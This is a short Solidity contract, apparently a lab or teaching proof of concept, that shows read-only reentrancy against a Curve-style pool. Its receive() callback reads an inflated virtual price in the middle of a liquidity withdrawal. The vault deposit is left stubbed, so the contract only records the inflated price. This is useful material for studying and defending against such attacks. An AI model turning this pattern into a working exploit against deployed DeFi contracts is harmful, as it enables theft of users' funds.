// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;
import {CurveStylePool, PriceVault} from "./Pool.sol";

/// @title ROAttacker — durante removeLiquidity lee getVirtualPrice inflado y deposita en vault
contract ROAttacker {
    CurveStylePool public pool;
    PriceVault public vault;
    bool private attacking;
    constructor(address p, address v) { pool = CurveStylePool(p); vault = PriceVault(v); }

    function seed() external payable {
        pool.addLiquidity{value: msg.value}();
    }

    function attack() external payable {
        attacking = true;
        uint256 myLP = pool.lp(address(this));
        pool.removeLiquidity(myLP / 2);
        attacking = false;
    }

    receive() external payable {
        if (attacking) {
            // Precio inflado porque ethReserves aún no bajó
            uint256 price = pool.getVirtualPrice();
            // Depositamos 1 wei al vault aprovechando precio manipulado
            // (demo: solo registramos que el precio está inflado)
            price; // silence
        }
    }

    function manipulatedPrice() external view returns (uint256) {
        return pool.getVirtualPrice();
    }
}
